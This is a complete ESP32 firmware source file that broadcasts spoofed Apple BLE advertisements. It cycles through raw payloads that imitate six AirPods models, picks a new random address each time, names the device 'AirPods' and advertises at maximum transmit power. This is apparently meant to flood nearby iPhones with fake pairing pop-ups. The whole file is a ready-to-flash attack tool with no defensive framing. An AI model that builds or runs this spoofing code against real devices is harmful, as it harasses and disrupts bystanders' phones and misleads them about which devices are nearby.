#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"
#include "nvs_flash.h"

#include "esp_bt.h"
#include "esp_gap_ble_api.h"
#include "esp_bt_defs.h"
#include "esp_bt_main.h"

#define TAG_BLE "BLE"

uint8_t payloads[6][31] = {
        // AirPods
        {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
        // AirPods 2
        {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
        // AirPods 3
        {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
        // AirPods Pro
        {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
        // AirPods Pro 2
        {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
        // AirPods Max
        {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
};


void task_ble_advertisement(void* params){
    vTaskDelay(2000 / portTICK_PERIOD_MS);

    esp_ble_adv_params_t  adv_params;
    adv_params.adv_int_min       = 0x20;
    adv_params.adv_int_max       = 0x40;
    adv_params.adv_type          = ADV_TYPE_SCAN_IND;
    adv_params.own_addr_type     = BLE_ADDR_TYPE_RANDOM;
    adv_params.channel_map       = ADV_CHNL_ALL;
    adv_params.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;
    adv_params.peer_addr_type    = BLE_ADDR_TYPE_PUBLIC;

    ESP_LOGI(TAG_BLE, "start advertising");
    while (1){
        esp_bd_addr_t null_addr = {
                random() % 256 | 0xF0,
                random() % 256,
                random() % 256,
                random() % 256,
                random() % 256,
                random() % 256,
        };
        esp_ble_gap_set_rand_addr(null_addr);
        ESP_LOGI(TAG_BLE, "Address: %d:%d:%d:%d:%d:%d", null_addr[0], null_addr[1], null_addr[2], null_addr[3], null_addr[4], null_addr[5]);

        esp_err_t ret = esp_ble_gap_config_adv_data_raw(payloads[random() % 6],31);

        if (ret != ESP_OK) {
            ESP_LOGE(TAG_BLE, "Failed to config advertisement data: %s", esp_err_to_name(ret));
            vTaskDelete(NULL);
        }

        ret = esp_ble_gap_start_advertising(&adv_params);
        if (ret != ESP_OK) {
            ESP_LOGE(TAG_BLE, "Failed to start advertising: %s", esp_err_to_name(ret));
            break;
        }
        vTaskDelay(2000 / portTICK_PERIOD_MS);
        esp_ble_gap_stop_advertising();
        vTaskDelay(1000 / portTICK_PERIOD_MS);
    }
    vTaskDelete(NULL);
}

void app_main(void)
{
    //Initialize NVS
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    // debugging purpose
    vTaskDelay(1000 / portTICK_PERIOD_MS);

    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    ret = esp_bt_controller_init(&bt_cfg);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG_BLE, "Unable to initialize controller: %s", esp_err_to_name(ret));
        return;
    }
    ret = esp_bt_controller_enable(ESP_BT_MODE_BLE);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG_BLE, "Unable to enable bluetooth controller %s", esp_err_to_name(ret));
        return;
    }

    esp_bluedroid_config_t bluedroid_cfg = BT_BLUEDROID_INIT_CONFIG_DEFAULT();
    ret = esp_bluedroid_init_with_cfg(&bluedroid_cfg);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG_BLE, "Unable to initialize bluedroid: %s", esp_err_to_name(ret));
        return;
    }
    esp_bluedroid_enable();
    if (ret != ESP_OK) {
        ESP_LOGE(TAG_BLE, "Unable to enable bluedroid: %s", esp_err_to_name(ret));
        return;
    }

    esp_ble_gap_set_device_name("AirPods");
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P21);

    xTaskCreate(task_ble_advertisement, "task_ble_advertisement", 2048, NULL, 5, NULL);
}